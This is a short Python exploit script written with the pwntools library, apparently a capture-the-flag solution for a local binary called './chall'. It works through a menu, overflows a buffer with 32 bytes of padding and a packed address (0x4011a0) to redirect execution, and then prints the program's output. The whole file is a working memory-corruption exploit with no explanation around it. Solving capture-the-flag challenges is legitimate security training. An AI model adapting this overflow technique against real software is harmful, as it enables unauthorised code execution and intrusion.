from pwn import *


p = process("./chall")

p.recvuntil("choice: ")
p.sendline(b"2")
p.recvuntil("buffer:")

offset = 32

payload = b"a"*offset
payload += p64(0x00000000004011a0)
p.sendline(payload)


p.recvuntil("choice: ")
p.sendline(b"1")
print(p.recvline().decode())


p.recvuntil("choice: ")
p.sendline(b"4")
print(p.recvall().decode())
